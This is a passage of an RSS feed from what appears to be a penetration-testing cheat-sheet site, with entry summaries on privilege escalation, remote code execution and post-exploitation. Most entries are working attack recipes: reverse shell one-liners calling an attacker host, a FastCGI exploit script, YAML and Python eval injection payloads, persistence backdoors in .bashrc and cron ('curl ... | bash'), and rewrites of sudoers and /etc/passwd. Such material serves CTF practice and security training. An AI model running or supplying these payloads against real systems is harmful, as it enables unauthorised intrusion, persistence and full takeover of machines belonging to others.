      <pubDate>Sat, 15 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/icinga-web-pentesting/</guid>
      <description>Remote Code Execution (CVE-2022-24715) linkAuthenticated user can execute arbitrary code.&#xA;Automation linkThis repository is available for reverse shell automatically.&#xA;In local machine, start a listener.&#xA;nc -lvnp 4444 Next create a PEM file and download the script, then execute it.&#xA;ssh-keygen -m pem # Location: cert.pem # Passphrase: (empty) wget https://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py python3 exploit.py -t http://example.com/icingaweb2/ -I &amp;lt;local-ip&amp;gt; -P 4444 -u username -p password -e cert.pem Manual Exploitation link*This content may not be working due to not enough verification.</description>
    </item>
    <item>
      <title>Python Eval Code Execution</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/</link>
      <pubDate>Tue, 11 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/</guid>
      <description>Investigation link eval(text) eval(f&amp;#34;5 &amp;#43; {num}&amp;#34;) If the Python script allows us to input some value to the &amp;ldquo;text&amp;rdquo; variable, we can inject arbitrary code.&#xA;Arbitrary Code Execution linkMost of the time, we need to bypass another expression to execute our desired command.&#xA;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;lt;!-- Bypass another expression in eval --&amp;gt; ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;#39;),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) },__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;)# Reverse Shell link __import__(&amp;#39;os&amp;#39;).system(&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;) </description>
    </item>
    <item>
      <title>FastCGI Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/fastcgi-pentesting/</link>
      <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/fastcgi-pentesting/</guid>
      <description>Investigation linkIf the PHP-FPM (FastCGI Process Manager) is running on the target system, we might be able to execute arbitrary command.&#xA;ps aux | cat php-fpm: pool username Remote Code Execution linkReference: https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi&#xA;We need to create an arbitrary PHP file somewhere. For instance,&#xA;touch /dev/shm/index.php Then create a shell script named &amp;ldquo;exploit.sh&amp;rdquo;.&#xA;#!/bin/bash PAYLOAD=&amp;#34;&amp;lt;?php echo &amp;#39;&amp;lt;!--&amp;#39;; system(&amp;#39;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 4444 &amp;gt;/tmp/f&amp;#39;); echo &amp;#39;--&amp;gt;&amp;#39;;&amp;#34; FILENAMES=&amp;#34;/dev/shm/index.php&amp;#34; # Exisiting file path HOST=$1 B64=$(echo &amp;#34;$PAYLOAD&amp;#34;|base64) for FN in $FILENAMES; do OUTPUT=$(mktemp) env -i \ PHP_VALUE=&amp;#34;allow_url_include=1&amp;#34;$&amp;#39;\n&amp;#39;&amp;#34;allow_url_fopen=1&amp;#34;$&amp;#39;\n&amp;#39;&amp;#34;auto_prepend_file=&amp;#39;data://text/plain\;base64,$B64&amp;#39;&amp;#34; \ SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \ cgi-fcgi -bind -connect $HOST:9000 &amp;amp;&amp;gt; $OUTPUT cat $OUTPUT done Now execute the shell script.</description>
    </item>
    <item>
      <title>Upgrade to Fully Interactive TTY</title>
      <link>https://documentnation.github.io/docs/hdks/shell/upgrade-to-fully-interactive-tty/</link>
      <pubDate>Sat, 08 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/shell/upgrade-to-fully-interactive-tty/</guid>
      <description>Upgrade linkAfter connecting to the target shell with reverse shell, it&amp;rsquo;s recommended to make the shell to be more elegant.&#xA;python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # or python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # or python2 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # or SHELL=/bin/bash script -q /dev/null The commands below make our shell even more perfect.&#xA;Ctrl&amp;#43;z stty raw -echo;fg Enter x2 export TERM=xterm </description>
    </item>
    <item>
      <title>Tar Wildcard Injection PrivEsc</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/tar-wildcard-injection-privesc/</link>
      <pubDate>Sat, 01 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/tar-wildcard-injection-privesc/</guid>
      <description>Investigation linkFor example, below command can be executed as root.&#xA;sudo -l (root) NOPASSWD: /opt/backup/baskup.sh Check If the File Contains Tar Command with Wildcards linkWe need to check the content in the file.&#xA;cat /opt/backup/backup.sh # -cf: create an archived file tar -cf backup.tar * The above tar command means that it creates an arvhived file from any input file because it passes wildcard (*).&#xA;Exploitation linkNow create a payload for privilege escalation.</description>
    </item>
    <item>
      <title>Ghidra Debug Mode RCE</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ghidra-debug-mode-rce/</link>
      <pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ghidra-debug-mode-rce/</guid>
      <description>Exploitation link jdb -attach 127.0.0.1:18001 &amp;gt; classpath &amp;gt; classes Log4j2-TF-4-Scheduled-1[1] stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run() Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec(&amp;#34;nc 10.0.0.1 4444 -e /bin/sh&amp;#34;) </description>
    </item>
    <item>
      <title>Python Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-privilege-escalation/</link>
      <pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-privilege-escalation/</guid>
      <description>Sudo PrivEsc linkReplace with Arbitrary Script link sudo -l (root) NOPASSWD: /usr/bin/python3 /home/&amp;lt;username&amp;gt;/example.py If the python script is under the current user&amp;rsquo;s home directory, we can remove the script and create the new one with the same name.&#xA;rm -rf /home/&amp;lt;username&amp;gt;/example.py touch /home/&amp;lt;username&amp;gt;/example.py We can insert arbitrary code in the new script. For example,&#xA;import os;os.system(&amp;#39;/bin/bash&amp;#39;) Module Hijacking linkAssume the python script can be executed as root with SETENV,NOPASSWD.&#xA;For example,</description>
    </item>
    <item>
      <title>Sudoedit Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/</link>
      <pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/</guid>
      <description>Investigation link sudo -l (root) sudoedit /opt/example.txt If we can execute sudoedit command as root, we might be able to escalate the privileges with some version.&#xA;Exploitation (CVE-2023-22809) link export EDITOR=&amp;#34;vim -- /etc/sudoers&amp;#34; sudoedit /opt/example.txt In vim editor, add the following line in /etc/sudoers.&#xA;Assume the current username is “john”&#xA;john ALL=(ALL:ALL) ALL After that, we can escalate to root privilege.&#xA;sudo su root </description>
    </item>
    <item>
      <title>irb (Interactive Ruby Shell) Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/irb-privilege-escalation/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/irb-privilege-escalation/</guid>
      <description>Exploitation link irb # #q!: Define a string literal &amp;gt; exec %q!whoami! &amp;gt; exec %q!cp /bin/bash /tmp/bash; chmod &amp;#43;s /tmp/bash! &amp;gt; exec %q!bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;! </description>
    </item>
    <item>
      <title>Outlook Reminder Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/outlook-reminder-privilege-escalation/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/outlook-reminder-privilege-escalation/</guid>
      <description>Exploitation linkTo carry out this attack, the OutlookSpy is required. So please install it before proceeding.&#xA;1. Start Responder linkFirst off, start responder in our local machine to capture NetNTLM authentication.&#xA;# -I: Interface (eth0, tun0, etc.) responder -I tun0 2. Modify Reminder Settings using OutlookSpy link In Outlook, select Home tab and click New Items then choose Appointment in drawer menu.&#xA;In new Appointment window, select OutlookSpy tab then click CurrentItem.</description>
    </item>
    <item>
      <title>Ruby Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ruby-privilege-escalation/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ruby-privilege-escalation/</guid>
      <description>Remote Code Execution with YAML linkCheck if the current user could run the ruby script as root privilege.&#xA;(root) NOPASSWD: /usr/bin/ruby sample.rb If the sample.rb contains the “File.read(’sample.yml’)”, modify the YAML file as follow:&#xA;--- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;amp;1 !ruby/object:Net::BufferedIO io: &amp;amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &amp;#34;abc&amp;#34; debug_output: &amp;amp;1 !ruby/object:Net::WriteAdapter socket: &amp;amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &amp;#39;Kernel&amp;#39; method_id: :system git_set: &amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/&amp;lt;local-port&amp;gt; 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34; method_id: :resolve Then start listener in local machine.</description>
    </item>
    <item>
      <title>Python Jails Escape</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-jails-escape/</link>
      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-jails-escape/</guid>
      <description>If we faced the Python script as follow, we cannot use common modules used for escalating privileges (&amp;ldquo;os&amp;rdquo;, &amp;ldquo;system&amp;rdquo;, etc.).&#xA;It appeared in Newbie CTF 2019.&#xA;#! /usr/bin/python3 def main(): text = input(&amp;#39;&amp;gt;&amp;gt; &amp;#39;) for keyword in [&amp;#39;eval&amp;#39;, &amp;#39;exec&amp;#39;, &amp;#39;import&amp;#39;, &amp;#39;open&amp;#39;, &amp;#39;os&amp;#39;, &amp;#39;read&amp;#39;, &amp;#39;system&amp;#39;, &amp;#39;write&amp;#39;]: if keyword in text: print(&amp;#34;No!!!&amp;#34;) return else: exec(text) if __name__ == &amp;#34;__main__&amp;#34;: main() We need to modify module names to allow us to execute them.</description>
    </item>
    <item>
      <title>Python Yaml Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-yaml-privilege-escalation/</link>
      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-yaml-privilege-escalation/</guid>
      <description>Investigation link import yaml filename = &amp;#34;example.yml&amp;#34; yaml.load() Payloads link import yaml from yaml import Loader, UnsafeLoader data = b&amp;#39;!!python/object/new:os.system [&amp;#34;cp `which bash` /tmp/bash;chown root /tmp/bash;chmod u&amp;#43;sx /tmp/bash&amp;#34;]&amp;#39; yaml.load(data) yaml.load(data, Loader=Loader) yaml.load(data, Loader=UnsafeLoader) yaml.load_all(data) yaml.load_all(data, Loader=Loader) yaml.load_all(data, Loader=UnsafeLoader) yaml.unsafe_load(data) Now execute the bash in privilege mode.&#xA;/tmp/bash -p Reverse Shell linkStart a listener in local machine.&#xA;nc -lvnp 1234 Then execute Python script that contains the following YAML code as root.</description>
    </item>
    <item>
      <title>Linux Backdoors</title>
      <link>https://documentnation.github.io/docs/hdks/linux/post-exploitation/linux-backdoors/</link>
      <pubDate>Sun, 19 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/post-exploitation/linux-backdoors/</guid>
      <description>.bashrc linkAdd this line to /root/.bashrc or /home/&amp;lt;user&amp;gt;/.bashrc to gain access to target machine by reverse shell when the victim user logged in.&#xA;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 Of course we need to always open netcat listener to be able to fetch incoming connection from the target.&#xA;nc -lvnp 4444 Cron linkAdd this line to the cron file like /etc/crontab in the target machine.&#xA;* * * * * root curl http://&amp;lt;local-ip&amp;gt;:&amp;lt;local-port&amp;gt;/shell | bash Create the “shell” file in local machine.</description>
    </item>
    <item>
      <title>Bash eq Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/bash-eq-privilege-escalation/</link>
      <pubDate>Thu, 16 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/bash-eq-privilege-escalation/</guid>
      <description>Investigation linkPlease see this post for details.&#xA;sudo -l (root) /bin/bash /opt/example.sh If we can execute above command as root, and the /opt/example.sh contains the numeric comparison such as [[ $var -eq 42 ]], we can execute arbitrary command.&#xA;#!/bin/bash read -rp &amp;#34;Enter guess: &amp;#34; num if [[ $num -eq 42 ]] then echo &amp;#34;Correct&amp;#34; else echo &amp;#34;Wrong&amp;#34; fi To execute arbitrary command, answer this question as below.&#xA;sudo /bin/bash /opt/example.</description>
    </item>
    <item>
      <title>Ansible Playbook Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ansible-playbook-privilege-escalation/</link>
      <pubDate>Tue, 14 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ansible-playbook-privilege-escalation/</guid>
      <description>PrivEsc with Tasks linkFirst off, check the content of playbook in /opt/ansible/playbooks.&#xA;For instance, a file named “httpd.yaml”.&#xA;- name: Install and configure Apache ... roles: - role: geerlingguy.apache tasks: - name: configure firewall firewalld: ... Next, check the content of configure files in /opt/ansible/roles/geerlingguy.apache/tasks.&#xA;And add the exploitable file in this.&#xA;For example, a file named “shell.yml”.&#xA;- hosts: localhost tasks: - name: RShell command: sudo bash /tmp/root.sh Create a exploit for reverse shell.</description>
    </item>
    <item>
      <title>Chrome Remote Debugger Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/chrome-remote-debugger-pentesting/</link>
      <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/chrome-remote-debugger-pentesting/</guid>
      <description>Investigation link /usr/bin/google-chrome --remote-debugging-port=12345 If the target system is running Google Chrome Debugger with specific port, we can port forward and may be able to retrieve sensitive data in browser debugging mode.&#xA;Exploitation link1. Port Forwarding linkFirst off, start port forwarding in local machine.&#xA;ssh -L 12345:127.0.0.1:12345 remote-user@example.com 2. Configure Network Targets in Chrome linkAssume the chrome debugger is running on port 12345.&#xA;Open Chrome browser and input the following string in URL bar at the top of the window.</description>
    </item>
    <item>
      <title>OpenSSL Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/openssl-privilege-escalation/</link>
      <pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/openssl-privilege-escalation/</guid>
      <description>Privilege Escalation (SUID) linkReference: https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/&#xA;1. Get Capabilities linkChack capabilities in the target machine.&#xA;# -r: recursive getcap -r / 2&amp;gt;/dev/null If you see the openssl has the capability set as below, you can successfully exploit it.&#xA;/usr/bin/openssl = cap_setuid&amp;#43;ep 2. Create the Exploit in C linkIn local machine, you need to have “libssl-dev” to use the header file named “openssl/engine.h” in the exploit.&#xA;If you don&amp;rsquo;t have it yet, install it.</description>
    </item>
    <item>
      <title>Apache Conf Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/apache-conf-privilege-escalation/</link>
      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/apache-conf-privilege-escalation/</guid>
      <description>Investigation link ls -al /etc/apache2 -rwxrwxrwx 1 root root 7094 NOV 7 2023 apache2.conf If we can modify the apache configuration file, we can update the web owner (www-data) to arbitrary user.&#xA;Exploitation link1. Update Apache.Conf linkFirst modify “apache.conf” file to change the web user with new one.&#xA;# These need to be set in /etc/apache2/envvars User www-data Group www-data 2. Insert Reverse Shell Script linkIn the web directory (e.g. /var/www/html), create the script to reverse shell.</description>
    </item>
    <item>
      <title>Sudo Tee Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/</link>
      <pubDate>Sun, 26 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/</guid>
      <description>Investigation link (root) NOPASSWD: /usr/bin/tee If we can execute tee command as root, we can escalate to privilege.&#xA;Exploitation link1. Create a New Password for New User linkAssume the new username is &amp;ldquo;tester&amp;rdquo;.&#xA;# -1: MD5 algorithm # -salt: Use privided salt -&amp;gt; The new username here openssl passwd -1 -salt &amp;#34;tester&amp;#34; &amp;#34;password123&amp;#34; # Output: $1$tester$LvsygQ2GEt7VUJQEqhMLf/ Copy the output password.&#xA;2. Write New Line with Tee linkPaste the password in printf and overwrite /etc/passwd using tee command.</description>
    </item>
    <item>
      <title>Sudo OpenVPN Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/</link>
      <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/</guid>
      <description>Investigation link (root) /usr/sbin/openvpn /opt/example.ovpn If we can execute openvpn command as root and we have a permission of editing the .ovpn file, we can escalate to privilege.&#xA;Exploitation link1. Create a Payload linkFirst create a shell script to reverse shell. For example, create /tmp/shell.sh.&#xA;Replace &amp;lt;local-ip&amp;gt; with your local ip address.&#xA;#!/bin/bash bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/4444 0&amp;gt;&amp;amp;1 Then change the file permission so that root can execute this script.</description>
    </item>
    <item>
      <title>Update-Motd Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/update-motd-privilege-escalation/</link>
      <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/update-motd-privilege-escalation/</guid>
      <description>Investigation link ls -al /etc/update-motd.d/ If we have permission to modify files in this directory, we can inject arbitrary code and execute when logging in.&#xA;Exploitation linkRun the following code to copy bash binary and give suid to this file.&#xA;Replace &amp;lt;username&amp;gt; with your current user name.&#xA;echo &amp;#34;cp /bin/bash /home/&amp;lt;username&amp;gt;/bash &amp;amp;&amp;amp; chmod u&amp;#43;s /home/&amp;lt;username&amp;gt;/bash&amp;#34; &amp;gt;&amp;gt; /etc/update-motd.d/00-header After that, log out and log in again with SSH. The above script should be executed.</description>
    </item>
    <item>
      <title>Sudo Umount Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-umount-privilege-escalation/</link>
      <pubDate>Wed, 15 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-umount-privilege-escalation/</guid>
      <description>Investigation link sudo -l (root) NOPASSWD: /bin/umount If we can execute umount command as root, we can escalate to privilege.&#xA;Exploitation linkIn target machine, check what directory is mounted.&#xA;cat /etc/fstab showmount -e localhost Assume the /opt/example folder is mounted.&#xA;If we unmount this folder, original files, that existed before the directory is mounted, may appear.&#xA;sudo /bin/umount /opt/example ls -al /opt/example </description>
    </item>
    <item>
      <title>Sudo Java Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/</link>
      <pubDate>Tue, 14 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/</guid>
      <description>Investigation link sudo -l (root) /usr/bin/java -jar *.jar If we can execute java command with arbitrary .jar file as root, we can escalate to privileges.&#xA;Exploitation link1. Create a JAR File linkFirst, create a custom jar file in local machine.&#xA;Replace &amp;lt;local-ip&amp;gt; with your local ip address.&#xA;msfvenom -p java/shell_reverse_tcp LHOST=&amp;lt;local-ip&amp;gt; LPORT=4444 -f jar -o shell.jar Then transfer the file to remote machine.&#xA;2. Reverse Shell linkIn local machine, start a listener.</description>
    </item>
    <item>
      <title>Sudo Service Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/</link>
      <pubDate>Sat, 11 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL : ALL) /usr/sbin/service vsftpd restart If we can execute service command as root, we may be able to escalate to root privilege.&#xA;Exploitation link1. Find the Location of the Config File linkAssume we can operate the vsftpd service as root. Firse off, find the service config file for vsftpd.&#xA;find / -name &amp;#34;*vsftpd*&amp;#34; For instance, we&amp;rsquo;ll find the location as below.&#xA;/lib/systemd/system/vsftpd.service /etc/systemd/system/multi-user.target.wants/vsftpd.service When getting the locations, the next thing to do is to check the permission.</description>
    </item>
    <item>
      <title>Iperius Backup Service Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/iperius-backup-service-privilege-escalation/</link>
      <pubDate>Wed, 08 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/iperius-backup-service-privilege-escalation/</guid>
      <description>Investigation linkFirst check if Iperius is running in target machine.&#xA;wmic service list | findstr &amp;#34;Iperius&amp;#34; If the Iperius service is running, we can gain access to administrator privilege.&#xA;Exploitation link1. Create a Payload linkIn target machine, create a .bat file named &amp;ldquo;exploit.bat&amp;rdquo;.&#xA;@echo off C:\Users\&amp;lt;USERNAME&amp;gt;\Downloads\nc.exe &amp;lt;attack_machine_ip&amp;gt; 1337 -e exploit.exe Then place it to Desktop.&#xA;When saving, be sure to save it as the file type &amp;ldquo;All Files&amp;rdquo; (NOT .txt).</description>
    </item>
    <item>
      <title>Windows PrivEsc with Unquoted Service Path</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-unquoted-service-path/</link>
      <pubDate>Wed, 08 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-unquoted-service-path/</guid>
      <description>Investigation linkIn target machine, find unquoted service path.&#xA;wmic service get name,displayname,pathname,startmode | findstr /i &amp;#34;Auto&amp;#34; | findstr /i /v &amp;#34;C:\\Windows\\&amp;#34; | findstr /i /v &amp;#34;&amp;#34;&amp;#34; &amp;#34; Also query the configuration information for a service.&#xA;sc qc &amp;#34;Development Service&amp;#34; For instance if the service path is &amp;ldquo;C:\Program Files\Development Files\Devservice Files\Service.exe&amp;rdquo;, we can place the exploit to &amp;ldquo;C:\Program Files\Devservice.exe&amp;rdquo; by ignoring paths after a space.&#xA;Exploitation link1. Create a Payload linkIn local machine, create a payload using msvenom.</description>
    </item>
    <item>
      <title>Snapd Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/snapd-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/snapd-privilege-escalation/</guid>
      <description>dirty_sock (CVE-2019-7304) Version &amp;lt; 2.37 linkReference: https://www.exploit-db.com/exploits/46361</description>
    </item>
    <item>
      <title>Sudo ClamAV Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/</guid>
      <description>Investigation linkIf we can execute “clamscan” command as root as below,&#xA;sudo /usr/bin/clamscan /etc/shadow --copy=/tmp/results we can read sensitive files by applying the custom yara rule.&#xA;Exploitation link1. Create a Yara Rule linkFirst off, check the location in which the yara file can be created.&#xA;find / -name &amp;#34;clam*&amp;#34; 2&amp;gt;/dev/null For instance, assume we can create the yara file under /var/lib/clamav/.&#xA;Create the yara rule in there.&#xA;Assume we want to read /etc/shadow, so specify the string “root” because the /etc/shadow contains “root” user name.</description>
    </item>
    <item>
      <title>Sudo Dstat Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/</guid>
      <description>dstat is a versatile tool for generating system resource statistics.&#xA;It allows users to create a custom plugin and execute by adding option e.g. dstat --myplugin.&#xA;Investigation link sudo -l (ALL) NOPASSWD: /usr/bin/dstat If we can execute &amp;ldquo;dstat&amp;rdquo; command as root, we can gain access to privileges by using our malicious plugin.&#xA;Exploitation link1. Create a New Dstat Plugin linkFirst off, find locate the &amp;ldquo;dstat&amp;rdquo; directory.&#xA;find / -type d -name dstat 2&amp;gt;/dev/null Assume the location of dstat is “/usr/local/share/dstat”.</description>
    </item>
    <item>
      <title>Sudo Exiftool Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/</guid>
      <description>Investigation link (root) NOPASSWD: /usr/local/bin/exiftool If we can execute &amp;ldquo;exiftool&amp;rdquo; command as root, we can gain access to privileges.&#xA;Arbitrary Code Execution (CVE-2021-22204) version 7.44+ linkReference: https://vk9-sec.com/exiftool-12-23-arbitrary-code-execution-privilege-escalation-cve-2021-22204/&#xA;Check the exiftool version.&#xA;If the exiftool version is later than 7.44, we can execute arbitrary code.&#xA;exiftool -ver Exploitation linkIn local machine, create the payload in a file named “exploit”.&#xA;(metadata &amp;#34;\c${system(&amp;#39;/bin/sh&amp;#39;)};&amp;#34;) Next, compress the file.&#xA;bzz exploit exploit.bzz Then create the DjVu file using the compressed file.</description>
    </item>
    <item>
      <title>Sudo Fail2ban Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/</guid>
      <description>Fail2ban is an intrusion prevention software framework.&#xA;It prevents against brute force attacks.&#xA;Investigation link sudo -l (root) NOPASSWD: /etc/init.d/fail2ban restart If we can execute &amp;ldquo;fail2ban&amp;rdquo; as root, we can gain access to privileges by modifying the configuration file.&#xA;We need to check if the config file is writable.&#xA;find /etc -writable -ls 2&amp;gt;/dev/null 4 drwxrwx--- 2 root security 4096 Oct 16 08:57 /etc/fail2ban/action.d Look inside of &amp;quot;/etc/fail2ban/jail.conf&amp;quot; to know more about how fail2ban is configured.</description>
    </item>
    <item>
      <title>Sudo Path Traversal Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL) /usr/bin/node /usr/local/scripts/*.js If the file path uses wildcards, we may execute arbitrary files.&#xA;In short, we can refer to files in different directories which the system owner unintended.&#xA;Exploitation linkAssume we can execute ‘node’ command as root and js file.&#xA;Create the “test.js” under /tmp, which spawns a root shell after executing ‘node’ command.&#xA;// /tmp/test.js require(&amp;#34;child_process&amp;#34;).spawn(&amp;#34;/bin/sh&amp;#34;, {stdio: [0, 1, 2]}) Now run ‘node’ command as root.</description>
    </item>
    <item>
      <title>Sudo Reboot Privilege Escalation</title>
